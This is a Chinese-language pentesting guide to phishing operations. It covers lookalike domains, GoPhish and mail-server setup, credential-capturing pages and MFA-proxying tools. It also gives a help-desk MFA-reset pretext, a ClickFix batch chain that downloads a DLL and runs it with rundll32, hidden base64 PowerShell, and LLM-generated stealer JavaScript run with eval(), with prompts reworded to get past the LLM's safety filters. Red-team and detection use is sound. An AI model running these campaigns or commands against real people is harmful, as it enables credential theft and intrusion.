# Phishing 方法论

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. Recon the victim
1. 选择 **目标域名**。
2. 执行一些基本的 Web 枚举，**搜索登录门户**（目标使用的）并**决定**你将**冒充**哪一个。
3. 使用一些 **OSINT** 来**查找邮箱地址**。
2. Prepare the environment
1. **购买** 将用于钓鱼评估的域名
2. **配置邮件服务** 相关记录 (SPF, DMARC, DKIM, rDNS)
3. 在 VPS 上配置 **gophish**
3. Prepare the campaign
1. 准备 **邮件模板**
2. 准备用于窃取凭证的 **网页**
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: 域名包含原始域名的一个重要**关键词**（例如，zelster.com-management.com）。
- **hypened subdomain**: 将子域名的**点替换为连字符**（例如，www-zelster.com）。
- **New TLD**: 使用**新的 TLD**的相同域名（例如，zelster.org）
- **Homoglyph**: 用**长得相似的字母**替换域名中的某个字母（例如，zelfser.com）。

{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** 交换域名中的两个字母（例如，zelsetr.com）。
- **Singularization/Pluralization**: 在域名末尾添加或移除 “s”（例如，zeltsers.com）。
- **Omission**: 从域名中**移除一个**字母（例如，zelser.com）。
- **Repetition:** 重复域名中的一个字母（例如，zeltsser.com）。
- **Replacement**: 类似 homoglyph 但不那么隐蔽。用另一个字母替换域名中的某个字母，可能是与原字母在键盘上相邻的字母（例如，zektser.com）。
- **Subdomained**: 在域名内部引入一个**点**（例如，ze.lster.com）。
- **Insertion**: 在域名中**插入一个字母**（例如，zerltser.com）。
- **Missing dot**: 将 TLD 直接附加到域名上。（例如，zelstercom.com）

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

存在一种可能性：存储或通信中的某些比特可能会由于太阳耀斑、宇宙射线或硬件错误等各种因素而**自动翻转**。

当该概念**应用于 DNS 请求**时，可能会出现**DNS 服务器接收到的域名**与最初请求的域名不一致的情况。

例如，域名 "windows.com" 中的单个位被修改就可能变为 "windnws.com"。

攻击者可能通过注册多个与受害者域名相似的 bit-flipping 域名来**利用**这一点。他们的目的是将合法用户重定向到他们自己的基础设施。

欲了解更多信息，请阅读 [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

你可以在 [https://www.expireddomains.net/](https://www.expireddomains.net) 搜索可用的过期域名作为候选。\
为了确保你将要购买的过期域名**已经具有良好的 SEO**，你可以检查其在以下分类中的归属：

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## 发现邮箱地址

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

为了**发现更多**有效的邮箱地址或**验证已经发现的**地址，你可以尝试对目标的 SMTP 服务器进行用户名爆破以确认邮箱地址。[在这里了解如何验证/发现电子邮件地址](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)。\
此外，别忘了如果用户使用**任何 Web 门户**访问他们的邮件，你可以检查该门户是否存在**用户名爆破**漏洞，并在可能的情况下利用该漏洞。

## 配置 GoPhish

### Installation

你可以从 [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) 下载

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
输出中会为 admin 用户在端口 3333 提供一个密码。因此，访问该端口并使用这些凭据更改 admin 密码。你可能需要将该端口隧道到本地：
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS 证书配置**

在此步骤之前，你应该**已经购买了要使用的域名**，并且它必须**指向**你配置**gophish**的**IP of the VPS**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**邮件配置**

开始安装：`apt-get install postfix`

然后将域名添加到以下文件：

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**还要更改 /etc/postfix/main.cf 中以下变量的值**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

最后将文件 **`/etc/hostname`** 和 **`/etc/mailname`** 修改为你的域名，并 **重启你的 VPS。**

现在为 `mail.<domain>` 创建一个 **DNS A 记录** 指向 VPS 的 **IP 地址**，并创建一个指向 `mail.<domain>` 的 **DNS MX 记录**

现在让我们测试发送一封邮件：
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 配置**

停止 gophish 的运行并进行配置。\
将 `/opt/gophish/config.json` 修改为如下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish 服务**

为了创建 gophish 服务，使其可以自动启动并作为服务管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成配置服务并检查其运行情况：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置邮件服务器和域名

### 等待并保持可信度

域名存在的时间越长，被判定为垃圾邮件的可能性就越低。因此在进行 phishing assessment 之前，你应尽可能等待更长时间（至少 1 周）。此外，如果你在域名下放置一个关于具有良好声誉行业的页面，所获得的信誉会更好。

注意，即使需要等一周，你也可以现在把所有配置完成。

### 配置反向 DNS (rDNS) 记录

设置 rDNS (PTR) 记录，使 VPS 的 IP 地址解析到域名。

### Sender Policy Framework (SPF) 记录

你必须 **为新域名配置 SPF 记录**。如果你不知道什么是 SPF 记录 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 来生成你的 SPF 策略（使用 VPS 机器的 IP）

![](<../../images/image (1037).png>)

以下内容需要作为域名的 TXT 记录设置：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 基于域的邮件认证、报告与一致性 (DMARC) 记录

你必须 **为新域配置 DMARC 记录**。如果你不知道什么是 DMARC 记录 [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一个新的 DNS TXT 记录，主机名指向 `_dmarc.<domain>`，内容如下：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

你必须**为新域名配置 DKIM**。如果你不知道 DMARC 记录是什么，[**阅读此页**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)。

本教程基于: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> 你需要将 DKIM 密钥生成的两个 B64 值连接起来：
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Test your email configuration score

你可以使用 [https://www.mail-tester.com/](https://www.mail-tester.com)\
只需访问该页面并向他们提供的地址发送一封电子邮件：
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你也可以通过发送电子邮件到 `check-auth@verifier.port25.com` 来**检查你的邮箱配置**，并**读取响应**（为此你需要**打开**端口**25**，如果以 root 身份发送邮件，可在文件 _/var/mail/root_ 中查看响应）。\
检查你是否通过所有测试：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你也可以**向你控制的 Gmail 发送一封消息**，并在你的 Gmail 收件箱中检查该邮件的**邮件头**，`dkim=pass` 应出现在 `Authentication-Results` 头字段中。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

页面 [www.mail-tester.com](https://www.mail-tester.com) 可以告诉你你的域名是否被 spamhouse 阻止。你可以在以下地址请求移除你的域名/IP：​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​你可以在 [https://sender.office.com/](https://sender.office.com) 请求移除你的域名/IP。

## Create & Launch GoPhish Campaign

### Sending Profile

- 为发送者配置设置一个**用于识别的名称**
- 决定你将使用哪个帐户发送 the phishing emails。建议：_noreply, support, servicedesk, salesforce..._
- 用户名和密码可以留空，但务必勾选 **Ignore Certificate Errors**

![](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> 建议使用 "**Send Test Email**" 功能来测试一切是否正常。\
> 我建议将**测试邮件发送到 10min mails addresses**，以避免在测试时被列入黑名单。

### Email Template

- 为模板设置一个**用于识别的名称**
- 然后写一个**主题**（不要太奇怪，只写你在常规邮件中可能会看到的内容）
- 确保已勾选 "**Add Tracking Image**"
- 编写**电子邮件模板**（你可以像下面示例那样使用变量）：
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
请注意，**为了提高邮件的可信度**，建议使用来自客户邮件中的某些签名。建议：

- 给一个**不存在的地址**发送邮件，查看回复中是否有签名。
- 搜索诸如 info@ex.com、press@ex.com 或 public@ex.com 之类的**公开邮箱**，向它们发送邮件并等待回复。
- 尝试联系一些**已发现的有效**邮箱并等待回复。

![](<../../images/image (80).png>)

> [!TIP]
> Email Template 还允许 **附加要发送的文件**。如果你还想通过一些特制的文件/文档窃取 NTLM challenges，请[阅读此页](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)。

### Landing Page

- 填写一个 **name**
- **编写网页的 HTML 代码**。注意你可以 **import** 网页。
- 勾选 **Capture Submitted Data** 和 **Capture Passwords**
- 设置一个 **redirection**

![](<../../images/image (826).png>)

> [!TIP]
> 通常你需要修改页面的 HTML 代码并在本地进行一些测试（可能使用 Apache 服务器），**直到你满意为止。** 然后，将该 HTML 代码写入文本框。\
> 注意如果你需要为 HTML 使用一些静态资源（例如一些 CSS 和 JS 页面），你可以将它们保存到 _**/opt/gophish/static/endpoint**_，然后从 _**/static/\<filename>**_ 访问它们。

> [!TIP]
> 对于重定向，你可以**将用户重定向到受害者的合法主网页**，或者将其重定向到 _/static/migration.html_，例如显示一个 **旋转等待图标（**[**https://loading.io/**](https://loading.io)**）持续 5 秒钟，然后提示流程已成功**。

### Users & Groups

- 设置一个 name
- **Import the data**（注意为了使用示例模板，你需要每个用户的 firstname、last name 和 email address）

![](<../../images/image (163).png>)

### Campaign

最后，创建一个 campaign，选择 name、email template、landing page、URL、sending profile 和 group。注意 URL 将是发给 victims 的链接。

注意 **Sending Profile 允许发送测试邮件以查看最终钓鱼邮件的样子**：

![](<../../images/image (192).png>)

> [!TIP]
> 我建议**将测试邮件发送到 10min mails 地址**，以免在测试时被列入黑名单。

一切准备就绪后，直接启动 campaign！

## Website Cloning

如果你出于任何原因想要克隆网站，请查看以下页面：

{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

在一些钓鱼评估（主要是为 Red Teams 服务）中，你可能还想**发送包含某种后门的文件**（可能是 C2，也可能只是触发某种认证）。\
请查看以下页面以获取一些示例：

{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

前面的攻击相当巧妙，因为你在伪造一个真实网站并收集用户填写的信息。不幸的是，如果用户没有输入正确的 password，或者你伪造的应用配置了 2FA，**这些信息将无法让你冒充被欺骗的用户**。

这时像 [**evilginx2**](https://github.com/kgretzky/evilginx2)、[**CredSniper**](https://github.com/ustayready/CredSniper) 和 [**muraena**](https://github.com/muraenateam/muraena) 这样的工具就很有用。该类工具允许你生成类似 MitM 的攻击。基本上，攻击的工作流程如下：

1. 你**冒充真实网页的 login**表单。
2. 用户将他的 **credentials** 发送到你的假页面，工具将这些转发给真实网页，**检查 credentials 是否有效**。
3. 如果账户配置了 **2FA**，MitM 页面会要求输入，一旦用户**提交**，工具会将其发送到真实网页。
4. 一旦用户通过认证，你（作为攻击者）将**捕获到 credentials、2FA、cookie 以及在工具执行 MitM 期间的所有交互信息**。

### Via VNC

如果不是**把受害者引到一个恶意页面**（看起来与原始页面相同），而是把他带到一个**连接到真实网页的浏览器的 VNC 会话**上会怎样？你将能够看到他在做什么，窃取 password、MFA、cookies……\
你可以使用 [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) 来实现这一点。

## Detecting the detection

显然，判断你是否已被发现的最佳方式之一是**在黑名单中搜索你的域名**。如果它被列出，你的域名就被检测为可疑。\
检查域名是否出现在任何黑名单的一个简单方法是使用 [https://malwareworld.com/](https://malwareworld.com)

然而，还有其他方法可以知道受害者是否**在积极查找网络上的可疑钓鱼活动**，如下面所述：

{{#ref}}
detecting-phising.md
{{#endref}}

你可以**购买一个与受害者域名非常相似的域名**，**和/或为你控制的某个域的子域生成证书**，该子域名中包含受害者域名的**关键词**。如果**受害者**对它们执行任何形式的 **DNS** 或 **HTTP** 交互，你就会知道**他正在积极寻找**可疑域名，此时你需要非常隐蔽。

### Evaluate the phishing

使用 [**Phishious** ](https://github.com/Rices/Phishious) 来评估你的邮件是否会进入垃圾邮件文件夹，或者是否会被阻止或成功。

## High-Touch Identity Compromise (Help-Desk MFA Reset)

现代入侵行动越来越多地完全跳过电子邮件诱饵，**直接针对 service-desk / identity-recovery 流程**来绕过 MFA。该攻击完全依赖“living-off-the-land”：一旦操作员获得有效 credentials，他们使用内置的管理员工具进行横向移动——不需要恶意软件。

### Attack flow
1. Recon the victim
- 从 LinkedIn、数据泄露、公开的 GitHub 等处收集个人和公司详情。
- 确定高价值身份（高管、IT、财务），并枚举用于 password / MFA 重置的**确切 help-desk 流程**。
2. Real-time social engineering
- 通过电话、Teams 或聊天与 help-desk 联系，冒充目标（经常使用 **spoofed caller-ID** 或 **cloned voice**）。
- 提供之前收集的 PII 以通过基于知识的验证。
- 说服代理**重置 MFA secret**或对注册的手机号码执行 **SIM-swap**。
3. Immediate post-access actions (≤60 min in real cases)
- 通过任何 web SSO 门户建立立足点。
- 使用内置工具枚举 AD / AzureAD（不投放二进制文件）：
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
- 使用 **WMI**、**PsExec** 或环境中已列入白名单的合法 **RMM** 代理进行横向移动。

### Detection & Mitigation
- 将 help-desk identity recovery 视为一种**特权操作**——要求 step-up auth & manager approval。
- 部署 **Identity Threat Detection & Response (ITDR)** / **UEBA** 规则以触发告警，例如：
  - MFA 方法更改 + 来自新设备/新地域的认证。
  - 同一主体（user→admin）的即时权限提升。
- 记录 help-desk 通话，并在任何重置之前强制回拨到**已注册的号码**。
- 实施 **Just-In-Time (JIT) / Privileged Access**，使新重置的账户**不会**自动继承高权限令牌。

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
通用团队通过大规模攻击抵消高接触操作的成本，这些攻击将**搜索引擎和广告网络变成投放渠道**。

1. **SEO poisoning / malvertising** 将一个假结果（例如 `chromium-update[.]site`）推到搜索广告顶部。
2. 受害者下载一个小型 **first-stage loader**（通常为 JS/HTA/ISO）。Unit 42 见到的示例包括：
- `RedLine stealer`
- `Lumma stealer`
- `Lampion Trojan`
3. Loader 外传浏览器 cookies + credential DBs，然后拉取一个**静默 loader**，该 loader 实时决定是否部署：
- RAT（例如 AsyncRAT、RustDesk）
- ransomware / wiper
- 持久化组件（注册表 Run 键 + 计划任务）

### Hardening tips
- 阻止新注册域名，并对搜索广告和电子邮件实施**高级 DNS / URL 过滤**。
- 将软件安装限制为签名的 MSI / Store 包，通过策略禁止 `HTA`、`ISO`、`VBS` 执行。
- 监控浏览器的子进程打开安装程序：
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
- 检索常被 first-stage loaders 滥用的 LOLBins（例如 `regsvr32`、`curl`、`mshta`）。

### ClickFix DLL delivery tradecraft (fake CERT update)
- 诱饵：克隆的国家 CERT 通告，带有一个 **Update** 按钮，显示逐步的“修复”说明。受害者被告知运行一个批处理，该批处理下载一个 DLL 并通过 `rundll32` 执行它。
- 典型的批处理链示例：
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
- `Invoke-WebRequest` 将有效负载写入 `%TEMP%`，短暂的等待掩盖了网络抖动，然后 `rundll32` 调用导出入口点（`notepad`）。
- DLL 会汇报主机身份并每隔几分钟轮询 C2。远程任务以 **base64-encoded PowerShell** 的形式到达，隐藏执行并绕过策略：
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
- 这保持了 C2 的灵活性（服务器可以在不更新 DLL 的情况下更换任务）并隐藏控制台窗口。可在 hunt 时查找由 `rundll32.exe` 启动的 PowerShell 子进程，且同时包含 `-WindowStyle Hidden`、`FromBase64String` 和 `Invoke-Expression`。
- 防御者可以查找形式为 `...page.php?tynor=<COMPUTER>sss<USER>` 的 HTTP(S) 回调以及 DLL 加载后每 5 分钟的轮询间隔。

---

## AI-Enhanced Phishing Operations
攻击者现在链式使用 **LLM & voice-clone APIs** 来进行完全个性化的诱饵和实时交互。

| 层级 | 威胁行为者的示例用途 |
|------|----------------------|
|Automation|生成并发送 >100k 封带有随机措辞和跟踪链接的邮件/SMS。|
|Generative AI|生成一次性邮件，引用公开的并购消息、来自社交媒体的内部笑话；在回电诈骗中使用深度伪造的 CEO 声音。|
|Agentic AI|自动注册域名、爬取开源情报、在受害者点击但未提交凭据时自动制作下一步邮件。|

**Defence:**
• 添加 **dynamic banners** 来突出显示来自不受信任自动化发送的消息（通过 ARC/DKIM 异常）。  
• 为高风险电话请求部署 **voice-biometric challenge phrases**。  
• 在意识培训中持续模拟 AI 生成的诱饵——静态模板已过时。

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

攻击者可以发布看似无害的 HTML，并通过向**受信任的 LLM API**请求 JavaScript 在运行时**生成 stealer**，然后在浏览器中执行它（例如通过 `eval` 或 动态 `<script>`）。

1. **Prompt-as-obfuscation：** 在 prompt 中对外联 URL/Base64 字符串进行编码；迭代措辞以绕过安全过滤并减少幻觉。
2. **Client-side API call：** 在加载时，JS 调用公共 LLM（Gemini/DeepSeek 等）或 CDN 代理；静态 HTML 中仅包含 prompt/API 调用。
3. **Assemble & exec：** 将响应拼接并执行（每次访问均可产生多态）：
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** 生成的代码会个性化诱饵（例如，LogoKit token parsing），并将 creds 发布到 prompt-hidden endpoint。

**规避特征**
- 流量访问知名的 LLM 域名或可信的 CDN 代理；有时通过 WebSockets 到后端。
- 没有静态 payload；恶意 JS 仅在渲染后存在。
- 非确定性生成会为每个会话产生 **unique** stealers。

**检测思路**
- 在启用 JS 的 sandboxes 中运行；标记 **runtime `eval`/dynamic script creation sourced from LLM responses**。
- 搜索前端对 LLM APIs 的 POSTs，紧接着在返回文本上执行 `eval`/`Function`。
- 对客户端流量中未经授权的 LLM 域名及随后发生的 credential POSTs 发出警报。

---

## MFA Fatigue / Push Bombing Variant – 强制重置
除了经典的 push-bombing 外，操作者在 help-desk 通话期间简单地 **force a new MFA registration**，使用户现有的 token 失效。随后出现的任何登录提示对受害者看起来都是合法的。
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor for AzureAD/AWS/Okta events where **`deleteMFA` + `addMFA`** occur **within minutes from the same IP**.

## Clipboard Hijacking / Pastejacking

攻击者可以从被入侵或 typosquatted 的网页悄悄将恶意命令复制到受害者的剪贴板，然后诱导用户在 **Win + R**、**Win + X** 或 terminal window 中粘贴并执行这些命令，从而在无需下载或附件的情况下执行任意代码。

{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Romance-gated APK + WhatsApp pivot (dating-app lure)
* The APK embeds static credentials and per-profile “unlock codes” (no server auth). 受害者按照假的 exclusivity 流程（login → locked profiles → unlock），在输入正确代码后，会被重定向到与攻击者控制的 `+92` 号码的 WhatsApp 聊天，同时 spyware 在后台静默运行。
* Collection starts even before login：会立即 exfil **device ID**、联系人（从缓存以 `.txt` 形式）以及文档（images/PDF/Office/OpenXML）。一个 content observer 会自动上传新照片；一个定时任务每 **5 minutes** 重新扫描新文档。
* Persistence：注册 `BOOT_COMPLETED` 并保持一个 **foreground service** 存活，以在重启和后台清理后维持存在。

### WhatsApp device-linking hijack via QR social engineering
* 诱饵页面（例如伪造的 ministry/CERT “channel”）显示 WhatsApp Web/Desktop 的 QR 并指示受害者扫描，从而在不知情的情况下将攻击者添加为 **linked device**。
* 攻击者会立即获得聊天/联系人的可见性，直到会话被移除。受害者可能稍后会看到 “new device linked” 的通知；防御方可以在访问不受信任的 QR 页面后短时间内搜寻意外的 device-link 事件。

### Mobile‑gated phishing to evade crawlers/sandboxes
运营者越来越多地在简单的设备检查后才放行 phishing 流程，以致桌面爬虫永远无法到达最终页面。一个常见模式是一个小脚本检测是否为 touch-capable DOM，并将结果 post 到服务器端点；非 mobile 客户端会收到 HTTP 500（或空白页），而 mobile 用户则被呈现完整流程。

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 逻辑（简化）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
常见的服务器行为：
- 首次加载时设置 session cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，对后续的 GET 返回 500（或占位内容）；仅当 `true` 时才提供钓鱼内容。

狩猎与检测启发式：
- urlscan 查询： `filename:"detect_device.js" AND page.status:500`
- Web 遥测：请求序列 `GET /static/detect_device.js` → `POST /detect` → 对非移动设备返回 HTTP 500；真实的移动受害者路径会返回 200 并随附 HTML/JS。
- 对仅依赖 `ontouchstart` 或类似设备检测来决定内容的页面进行阻断或严格审查。

防御建议：
- 以类似移动设备的指纹并启用 JS 运行爬虫，以揭露被门控的内容。
- 对新注册域名上在 `POST /detect` 后出现的可疑 500 响应发出警报。

## 参考资料

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
